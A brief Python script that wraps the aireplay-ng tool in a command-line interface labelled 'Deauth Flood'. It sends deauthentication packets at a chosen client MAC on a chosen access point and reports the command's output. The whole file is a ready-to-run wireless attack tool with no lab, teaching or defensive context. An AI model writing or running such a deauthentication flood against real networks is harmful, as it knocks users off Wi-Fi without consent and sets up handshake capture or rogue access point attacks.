#!/usr/bin/env python3

import subprocess
import argparse

def run_aireplay(deauth_target, ap_mac, iface, count=100):
    cmd = [
        "aireplay-ng",
        "--deauth", str(count),
        "-a", ap_mac,
        "-c", deauth_target,
        iface
    ]
    print(f"[+] Executing: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {
            "command": " ".join(cmd),
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.returncode
        }
    except Exception as e:
        return {
            "error": str(e)
        }

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aireplay-ng Deauth Flood")
    parser.add_argument("--target", help="Target Client MAC", required=True)
    parser.add_argument("--ap", help="Access Point MAC", required=True)
    parser.add_argument("--iface", help="Monitor mode interface", required=True)
    parser.add_argument("--count", help="Number of deauth packets", type=int, default=100)
    args = parser.parse_args()

    output = run_aireplay(args.target, args.ap, args.iface, args.count)
    print(output["stdout"])
    if output["stderr"]:
        print("[stderr]", output["stderr"])
